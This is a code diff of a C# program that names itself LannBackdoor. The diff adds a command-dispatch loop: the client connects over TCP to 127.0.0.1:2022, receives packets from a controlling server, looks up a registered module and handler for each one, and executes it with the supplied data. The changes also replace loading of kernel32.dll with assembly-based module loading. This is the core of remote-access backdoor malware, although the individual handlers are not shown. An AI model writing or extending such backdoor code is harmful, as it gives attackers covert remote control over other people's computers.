@@ -1,10 +1,10 @@
 ﻿using System.Net.Sockets;
 using LannLogger;
-using Modules;
+using ModulesApi;
 using Networking;
 using Networking.Packets;
-using Newtonsoft.Json;
 using Serilog.Core;
+using SystemModule;
 using Constants = LannConstants.Constants;
 
 namespace LannBackdoor;
@@ -23,8 +23,7 @@ public static class LannBackdoor {
             "127.0.0.1",
             2022);
         
-        ModuleRegistry.Instance.LoadModule("kernel32.dll");
-        
+        ModuleRegistry.LoadByAssembly(typeof(SystemModuleImpl).Assembly);
         _tcpClient = new TCPClient();
 
         _tcpClient.OnConnect += async (_, _) => {
@@ -38,15 +37,37 @@ public static class LannBackdoor {
 
         _tcpClient.OnCommand += async (_, data) => {
             Packet packet = data.Packet;
-            Logger.Debug("Packet received: {Module}/{Handler}: {Data}",
+            Logger.Debug("Packet received ({Format}): {Module}/{Handler}: {Data}",
+                packet.IsDataRaw ? "RAW" : "JSON",
                 packet.ModuleId,
                 packet.HandlerId,
                 packet.GetData<object>());
+
+            ModuleInfo? module = ModuleRegistry.Get(packet.ModuleId);
+            if (module == null) {
+                Logger.Debug("Unknown module: {Id}", packet.ModuleId);
+                return;
+            }
+
+            HandlerInfo? handler = module.GetHandler(packet.HandlerId);
+            if (handler == null) {
+                Logger.Debug("Unknown handler: {Module}/{Id}",
+                    packet.ModuleId,
+                    packet.HandlerId);
+                return;
+            }
+
+            try {
+                Type type = handler.GetDataType();
+                await handler.Execute(_tcpClient, packet.GetData<object>(type));
+            } catch (Exception e) {
+                Logger.Error("Failed to invoke handler: {Error}", e.Message);
+            }
         };
 
         await Connect();
     }
-
+    
     private static async Task Connect() {
         try {
             await _tcpClient.Connect();
